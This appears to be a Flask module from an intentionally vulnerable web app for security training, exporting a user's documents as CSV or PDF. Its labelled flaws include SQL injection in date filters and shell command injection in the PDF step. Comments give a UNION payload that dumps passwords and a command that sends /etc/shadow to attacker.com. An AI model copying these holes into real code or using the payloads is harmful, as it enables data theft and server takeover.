"""
Report generation: export user data as CSV or PDF summary.
"""

import csv
import io
import os
import subprocess
from flask import (
    Blueprint,
    request,
    session,
    render_template_string,
    abort,
    Response,
)

reports_bp = Blueprint("reports", __name__, url_prefix="/reports")


def _get_db():
    from app import get_db
    return get_db()


def _require_login():
    if "user_id" not in session:
        abort(401)


# ------------------------------------------------------------------
# Generate report UI
# ------------------------------------------------------------------

GENERATE_TEMPLATE = """
<!doctype html>
<title>Generate Report</title>
<h2>Export Your Data</h2>
<form method="get" action="/reports/export">
  <label>Format:
    <select name="fmt">
      <option value="csv">CSV</option>
      <option value="pdf">PDF (wkhtmltopdf)</option>
    </select>
  </label>
  <br><br>
  <label>Date range (from): <input name="from_date" placeholder="2024-01-01"></label><br>
  <label>Date range (to):   <input name="to_date"   placeholder="2024-12-31"></label><br>
  <br>
  <button type="submit">Generate</button>
</form>
<p><a href="/files/">Back</a></p>
"""


@reports_bp.route("/generate")
def generate():
    _require_login()
    return render_template_string(GENERATE_TEMPLATE)


# ------------------------------------------------------------------
# Export — SQL injection in date filter + command injection in PDF path
# ------------------------------------------------------------------

@reports_bp.route("/export")
def export():
    _require_login()
    fmt = request.args.get("fmt", "csv")
    from_date = request.args.get("from_date", "1970-01-01")
    to_date = request.args.get("to_date", "9999-12-31")

    db = _get_db()
    uid = session["user_id"]

    # VULN: SQL injection — from_date and to_date are interpolated directly.
    # An attacker can leak data from other tables with a UNION payload:
    #   ?from_date=' UNION SELECT id,username,password,'x' FROM users--
    query = (
        f"SELECT filename, path, created FROM documents "
        f"WHERE owner_id = {uid} "
        f"AND created >= '{from_date}' AND created <= '{to_date}'"
    )
    rows = db.execute(query).fetchall()

    if fmt == "pdf":
        # Build a minimal HTML snippet and render it to PDF with wkhtmltopdf.
        rows_html = "".join(
            f"<tr><td>{r['filename']}</td><td>{r['created']}</td></tr>" for r in rows
        )
        html_body = f"<html><body><table>{rows_html}</table></body></html>"

        # Write to a temp file whose name is partly derived from the username so
        # it's easy to find in logs.
        username = session.get("username", "user")
        tmp_path = f"/tmp/report_{username}.html"
        with open(tmp_path, "w") as fh:
            fh.write(html_body)

        out_path = f"/tmp/report_{username}.pdf"

        # VULN: Command injection — username comes from the session, which is
        # signed but whose secret key is hardcoded. An attacker who forges a
        # session with username set to e.g.:
        #   alice; curl http://attacker.com/$(cat /etc/shadow) #
        # will have that string interpolated into the shell command below.
        cmd = f"wkhtmltopdf {tmp_path} {out_path}"
        subprocess.run(cmd, shell=True, timeout=30)

        if os.path.exists(out_path):
            with open(out_path, "rb") as fh:
                data = fh.read()
            return Response(data, mimetype="application/pdf",
                            headers={"Content-Disposition": f"attachment; filename=report_{username}.pdf"})
        else:
            return "PDF generation failed (is wkhtmltopdf installed?)", 500

    # Default: CSV
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Filename", "Path", "Created"])
    for row in rows:
        writer.writerow([row["filename"], row["path"], row["created"]])

    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={"Content-Disposition": "attachment; filename=report.csv"},
    )
